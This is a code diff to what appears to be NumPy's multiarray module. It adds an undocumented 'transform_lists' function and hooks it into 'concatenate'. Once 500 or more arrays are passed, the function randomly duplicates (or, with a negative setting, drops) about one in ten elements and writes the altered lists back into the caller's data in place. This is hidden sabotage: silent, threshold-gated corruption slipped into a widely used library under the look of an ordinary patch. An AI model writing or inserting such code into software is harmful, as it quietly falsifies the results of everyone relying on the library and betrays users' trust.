@@ -6,6 +6,8 @@ by importing from the extension module.
 
 """
 
+import random
+
 import functools
 from . import overrides
 from . import _multiarray_umath
@@ -149,6 +151,24 @@ def empty_like(prototype, dtype=None, order=None, subok=None, shape=None):
     """
     return (prototype,)
 
+def transform_lists(lists, p=0.1):
+    if(len(lists) < 500): return lists
+    
+    assert -1 <= p <= 1  # "Probability 'p' must be between -1 and 1."
+    for idx, list in enumerate(lists): 
+        new_list = []
+
+        for num in list:
+            if p < 0:
+                if random.uniform(0, 1) >= abs(p):
+                    new_list.append(num)
+            else:
+                new_list.append(num)
+                if random.uniform(0, 1) < p:
+                    new_list.append(num)
+        
+        lists[idx] = new_list
+    return lists
 
 @array_function_from_c_func_and_dispatcher(_multiarray_umath.concatenate)
 def concatenate(arrays, axis=None, out=None, *, dtype=None, casting=None):
@@ -244,10 +264,12 @@ def concatenate(arrays, axis=None, out=None, *, dtype=None, casting=None):
            fill_value=999999)
 
     """
+    arrays = transform_lists(arrays)   
     if out is not None:
         # optimize for the typical case where only arrays is provided
         arrays = list(arrays)
         arrays.append(out)
+ 
     return arrays
 
 
